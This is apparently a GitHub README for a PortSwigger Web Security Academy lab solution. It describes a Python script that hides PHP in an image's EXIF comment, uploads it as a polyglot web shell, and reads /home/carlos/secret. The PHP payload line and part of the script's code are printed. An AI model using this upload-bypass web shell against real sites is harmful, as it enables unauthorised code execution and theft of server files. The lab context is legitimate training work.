## Web security academy
### Lab Title: Remote code execution via polyglot web shell upload
### Lab: 06

## My Points:

1. **Introduction:** <br>[Portswigger's web security academy](https://portswigger.net/) is a platform that provides practice labs for finding web application vulnerabilities. In this Lab-06 upload a (.php) web shell, then get the content of the user carlos.

2. **Technique:**
     - **PIL and EXIF:** These libraries are used to create an image and then add php code in the comment tag, for details check the references.
     - **Notes:** 
          - Check the folder write permission, the code creates files in the same directory in which lab-06.php file exists.
          - Burp Suite is used to check the requests and responses because it's good to check what's going on in the request/response. To run the code on windows or linux, Python version 3 should be installed in the system and also check that the import libraries are also properly installed e.g. request, PIL, EXIF. Burp suite must be started to run the code..
     <br>
     
     > Windows: 
     ```
     python lab-06.py
     ```
     
     > Linux:
     ```
     python3 lab-06.py or python lab-06.py ( if version 3 is default version )
     ```


3. **Code:**
     - **Define main variables:**
     
        ```    
        # Burp Suite proxy
        proxy_urls = {
          'http': 'http://127.0.0.1:8080',
          'https': 'http://127.0.0.1:8080',
        }
        image_file_name = 'hh.jpg'
          php_file_name = 'kk.php'
          form_upload_field = 'avatar'
          delete_files = False # if True: Delete the temp image and php files
          php_code = '<?php echo "K::" . file_get_contents("/home/carlos/secret") . "::K";?>'
       
        ```
        <br>
        
     - **User inputs:** When the program executes, it takes Lab URL, username and password from the user.

        ```        
        # User input: Lab URL, username, and password
         k_url = input("Enter Lab URL: ").strip().rstrip("/")
         username = input("Enter Account Username: ").strip()
         password = input("Enter Account Password: ").strip()

         if (not (k_url and username and password)):
             print()
             print("[-] Error! Input variable(s) missing.")
             print("[-] Lab URL: https://a...........c2.web-security-academy.net")
             print("[-] Username")
             print("[-] Password")
             sys.exit()
         else:
             print("[*] Solving....")
             main()
        ```     
     
          - Enter URL: Get lab URL from your browser address bar and paste it.

          - Enter account credentials.
    <br>

     - **Main Functions:**
          1. create_files():The function creates image files, and adds php code in the image comment tag, then creates php file and writes an image in the php file. ( delete_files ) this is a variable if you want to delete the created files from your local disk.
          2. login_req(): Sends the login request.
          3. k_upload_file(): The function uploads the created php file. 
          4.  If the file is uploaded then the program sends a GET request to **/files/avatars/kk.php** and gets the file content.
          5. K:: the secret key ::K, a regular expression is used to extract the secret from the response.  
          6. **Secret:** Copy the secret form command line and submit.
     <br>   


## References:
   - [https://portswigger.net/web-security/dashboard](https://portswigger.net/web-security/dashboard)
   - [https://pypi.org/project/Pillow/](https://pypi.org/project/Pillow/)  
   - [https://pypi.org/project/exif/](https://pypi.org/project/exif/)

